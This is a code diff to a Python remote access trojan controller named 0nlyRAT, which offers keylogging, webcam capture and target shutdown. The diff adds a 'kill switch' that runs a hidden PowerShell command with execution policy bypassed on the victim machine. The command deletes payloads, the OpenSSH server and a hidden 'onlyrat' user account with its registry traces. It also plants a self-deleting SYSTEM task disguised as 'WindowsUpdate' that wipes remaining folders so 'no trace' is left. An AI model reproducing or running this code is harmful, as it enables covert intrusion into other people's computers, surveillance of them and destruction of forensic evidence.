@@ -50,6 +50,7 @@ options_menu = """
                 [8]  shutdown target
                 [9]  Install Webcam Capture
                 [10] Fetch Webcam Capture
+                [x] KILL THYSELF!
 
             [+] Options:
                 [-h] or [--help]     ---   help
@@ -66,6 +67,8 @@ header = f"[~] {username}@onlyrat $ "
 remote_path = "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads"
 local_path = f"/home/{username}/.0nlyRAT" if username!="root" else "/root/.0nlyRAT"
 # local_download_path = f"/home/{username}/Downloads" if username!="root" else "/root/Downloads"
+regProfileList = ""
+regHideUser = ""
 
 IP_KEY = "IPADDRESS"
 PASS_KEY = "PASSWORD"
@@ -140,6 +143,20 @@ def upload(ipv4,pword,temp_dir):
     print("\n[*] Uploading...")
     remote_upload(ipv4,pword,upload_file_path,temp_dir)
     print(f"[+] Successfully uploaded at \"{temp_dir}\"")
+
+def killSwitch(ipv4,pword,temp_dir,startup_dir):
+    print("[*] Are you sure (y/n)?\nThis Action is Irreversible.\n")
+    ans = input(header)
+    if ans in 'n':
+        main()
+    else:
+        print("[*] Preparing Kill Switch....")
+        killswitch_command = """powershell.exe -noP -ep bypass -w hidden -c "& {Remove-Item -Path """+temp_dir+"""/* -Force -Recurse;Remove-Item -Path '\\''"""+startup_dir+"""/*.cmd'\\'' -Force -Recurse;Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Remove-LocalUser -name onlyrat;Get-ItemProperty -Path '\\'HKLM:/SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList/*\\''|?{$_.ProfileImagePath -match '\\'C:\\\\\\\\Users\\\\\\\\onlyrat*\\''}|%{Remove-Item -Path $_.PSPath -Force -Recurse};Remove-Item -Path '\\'HKLM:/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon/SpecialAccounts\\'' -Force -Recurse;schtasks /create /tn 'WindowsUpdate' /tr '\\'powershell -noprofile -executionpolicy bypass -command \"Start-Sleep 5;Get-ChildItem -Path C:/Users -Filter onlyrat* -Directory -Force|Remove-Item -Force -Recurse -ErrorAction SilentlyContinue;schtasks /delete /tn WindowsUpdate /f\"\\'' /sc onstart /ru SYSTEM /f;}" """
+        print(killswitch_command)
+        print("[+] KillSwitch prepapped")
+        print("\n[*] Executing KillSwitch...")
+        remote_command(ipv4,pword,killswitch_command)
+        print("[+] Executed killswitch. No Trace left in target host...")
 
 def keylogger(ipv4,pword,temp_path,startup_path):
     print("[+] Initializing keylogger....")
@@ -265,6 +282,8 @@ def cli(arguments):
                     install_camcap(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option == "10":
                     fetch_camcapture(tgt_ipv4,tgt_pword,tgt_td,tgt_uname)
+                elif option in ['x','X']:
+                    killSwitch(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option in ["config","c"]:
                     show_config(configuration)
                 elif option == "help":
